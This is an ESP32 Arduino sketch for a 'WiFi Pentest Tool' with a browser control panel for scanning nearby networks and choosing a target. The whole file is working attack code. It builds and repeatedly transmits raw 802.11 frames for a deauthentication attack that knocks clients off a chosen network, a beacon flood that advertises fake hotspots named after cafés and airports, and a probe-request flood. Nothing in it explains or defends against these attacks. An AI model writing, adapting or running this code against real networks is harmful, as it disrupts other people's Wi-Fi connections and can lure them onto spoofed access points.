#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include <vector>

WebServer server(80);
bool deauthActive = false;
bool beaconFloodActive = false;
bool probeFloodActive = false;
int selectedNetwork = -1;
String selectedAttack = "";

struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

std::vector<NetworkInfo> networks;

// Deauthentication packet transmitter
void sendDeauth(uint8_t* bssid, int channel, uint8_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, reason, 0x00 
  };
  memcpy(packet + 10, bssid, 6);
  memcpy(packet + 16, bssid, 6);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    delay(1);
  }
}

// Beacon Flood (Fake Access Points) transmitter
void sendBeaconFlood() {
  uint8_t packet[128] = {
    0x80, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04,
    0x00, 0x00, // SSID tag
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
    0x03, 0x01, 0x06
  };
  String fakeSSIDs[] = {"FreeWiFi", "PublicWiFi", "Starbucks", "McDonalds", "AirportWiFi", "GUEST_ACCESS"};
  for (int i = 0; i < 5; i++) {
    for (int j = 0; j < 6; j++) { packet[10 + j] = packet[16 + j] = random(256); }
    String ssid = fakeSSIDs[random(6)];
    packet[37] = ssid.length();
    for (int j = 0; j < ssid.length(); j++) { packet[38 + j] = ssid[j]; }
    int chan = random(1, 14);
    packet[50] = chan;
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + ssid.length() + 12, false);
    delay(5);
  }
}

// Probe Request Flood transmitter
void sendProbeFlood() {
  uint8_t packet[64] = { 0x40, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00 };
  String ssid = "PROBE_REQUEST_TEST";
  packet[24] = ssid.length();
  for (int j = 0; j < ssid.length(); j++) { packet[25 + j] = ssid[j]; }
  esp_wifi_80211_tx(WIFI_IF_AP, packet, 25 + ssid.length(), false);
}

void scanNetworks() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  networks.clear();
  for (int i = 0; i < n && i < 20; i++) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    net.channel = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    networks.push_back(net);
  }
}

String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
  html += "body{font-family:sans-serif; background:#f4f4f4; padding:20px;} .btn{padding:12px; margin:5px; border:none; border-radius:5px; cursor:pointer; font-weight:bold;}";
  html += ".danger{background:#e74c3c; color:white;} .ok{background:#2ecc71; color:white;} .warning{background:#f39c12; color:white;}";
  html += ".net{background:white; padding:10px; margin:5px 0; border-left:5px solid #3498db; cursor:pointer;} .selected{background:#ffecec; border-left:5px solid #e74c3c;}";
  html += "#status{padding:15px; margin-bottom:15px; background:#fff; border-radius:5px; font-weight:bold; border:1px solid #ddd;}</style>";
  html += "<script>function selectNetwork(i){fetch('/select?index='+i).then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function selectAttack(t){fetch('/selectAttack?type='+t).then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function toggleAttack(){fetch('/startAttack').then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function scan(){document.getElementById('status').innerHTML='Scanning...'; fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('networks').innerHTML=d; document.getElementById('status').innerHTML='Scan completed.';});}</script></head><body>";
  html += "<h1>EJDER WiFi Pentest Tool</h1><div id='status'>System Ready</div>";
  html += "<button class='btn ok' onclick='scan()'>Scan Networks</button>";
  html += "<h3>Attack Type</h3>";
  html += "<button class='btn danger' onclick=\"selectAttack('deauth')\">Deauth Attack</button>";
  html += "<button class='btn warning' onclick=\"selectAttack('beacon')\">Beacon Flood</button>";
  html += "<button class='btn warning' onclick=\"selectAttack('probe')\">Probe Flood</button>";
  html += "<br><button class='btn danger' style='width:100%; margin-top:20px;' onclick='toggleAttack()'>START / STOP ATTACK</button>";
  html += "<h3>Network List</h3><div id='networks'></div></body></html>";
  return html;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("EJDER", "EJDERYA32");

  server.on("/", HTTP_GET, []() { server.send(200, "text/html", getHTML()); });
  
  server.on("/scan", HTTP_GET, []() {
    scanNetworks();
    String res = "";
    for (int i = 0; i < networks.size(); i++) {
      res += "<div class='net' onclick='selectNetwork(" + String(i) + ")'><strong>" + networks[i].ssid + "</strong><br>RSSI: " + String(networks[i].rssi) + "dBm | CH: " + String(networks[i].channel) + "</div>";
    }
    server.send(200, "text/html", res);
  });

  server.on("/select", HTTP_GET, []() {
    if (server.hasArg("index")) {
      selectedNetwork = server.arg("index").toInt();
      server.send(200, "text/plain", "Target: " + networks[selectedNetwork].ssid);
    }
  });

  server.on("/selectAttack", HTTP_GET, []() {
    if (server.hasArg("type")) {
      selectedAttack = server.arg("type");
      deauthActive = beaconFloodActive = probeFloodActive = false;
      server.send(200, "text/plain", "Selected Attack: " + selectedAttack);
    }
  });

  server.on("/startAttack", HTTP_GET, []() {
    if (deauthActive || beaconFloodActive || probeFloodActive) {
      deauthActive = beaconFloodActive = probeFloodActive = false;
      server.send(200, "text/plain", "Attack STOPPED.");
    } else {
      if (selectedAttack == "deauth" && selectedNetwork != -1) {
        deauthActive = true;
        server.send(200, "text/plain", "Deauth started on: " + networks[selectedNetwork].ssid);
      }
      else if (selectedAttack == "beacon") {
        beaconFloodActive = true;
        server.send(200, "text/plain", "Beacon Flood STARTED!");
      }
      else if (selectedAttack == "probe") {
        probeFloodActive = true;
        server.send(200, "text/plain", "Probe Flood STARTED!");
      } else {
        server.send(200, "text/plain", "Error: Select attack type & network first.");
      }
    }
  });

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  server.handleClient();
  if (deauthActive && selectedNetwork != -1) {
    sendDeauth(networks[selectedNetwork].bssid, networks[selectedNetwork].channel, 2);
  }
  if (beaconFloodActive) { sendBeaconFlood(); }
  if (probeFloodActive) { sendProbeFlood(); }
  delay(1);
}